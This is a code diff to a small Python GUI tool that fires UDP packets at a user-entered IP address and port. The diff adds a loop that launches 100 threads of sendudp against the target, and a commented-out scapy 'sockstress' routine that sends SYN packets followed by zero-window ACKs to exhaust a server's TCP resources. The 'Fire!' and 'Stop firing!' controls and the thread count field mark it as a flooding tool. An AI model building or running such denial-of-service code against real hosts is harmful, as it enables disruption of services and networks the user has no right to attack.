@@ -1,5 +1,5 @@
 import socket
-
+import _thread
 try:
     import tkinter as tk  # for python 3
 except:
@@ -7,11 +7,35 @@ except:
 import pygubu
 
 
-def sendudp(ip_address, port, message):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind((ip_address,port))
-    sock.sendto(message.encode('utf-8'), (ip_address, int(port)))
+# class UdpStress:
+#     target = '127.0.0.1'
+#     port = 80
+#     threads = 1
+#
+#     def __init__(self, target, port, threads):
+#         self.target = target
+#         self.port = port
+#         self.threads = threads
 
+# def sockstress(self, target = target, port = port,verbose=0):
+#     while True:
+#         try:
+#             x = random.randint(0,65535)
+#             #dst = destination IP string
+#             #sport = source port
+#             #dport = destination port
+#             response = sr1(IP(dst=target)/TCP(sport=x, dport=port,flags='S'),timeout=1,verbose=verbose)
+#             send(IP(dst=target)/TCP(dport=port,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=verbose)
+#         except:
+#             pass
+
+
+def sendudp(ip_address, port, message):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
+    sock.sendto(bytes(message, "utf-8"), (ip_address, port))
+#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+#     sock.bind((ip_address, port))
+#     sock.sendto(message.encode('utf-8'), (ip_address, int(port)))
 
 
 class Application:
@@ -75,12 +99,24 @@ class Application:
             message = str((self.builder.get_object('entry_message')).get())
             label_ready = self.builder.get_object('label_ready')
 
+            threads = int((self.builder.get_object('entry_threads')).get())
+
             requestsCount = 0
 
-            while str(button_ready.cget('text')) == 'Stop firing!':
-                requestsCount += 1
-                label_ready.configure(text=str(requestsCount))
-                #sendudp(ip_address, port, message)
+            for x in range(0, 100):
+                try:
+                    threadnum = _thread.start_new_thread(sendudp, (ip_address, port, message))
+                    print("[",threadnum,"]UDP target IP:", ip_address)
+                    print("[",threadnum,"]UDP target port:", port)
+                    print("[",threadnum,"]message:", message)
+                    # while str(button_ready.cget('text')) == 'Stop firing!':
+                    #     requestsCount += 1
+                    #     label_ready.configure(text=str(requestsCount))
+                    # #   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    # #   sock.bind((ip_address, port))
+                    # #   sock.sendto(message.encode('utf-8'), (ip_address, int(port)))
+                except:
+                    print("Error starting thread")
         else:
             button_ready.configure(text='Fire!')
 
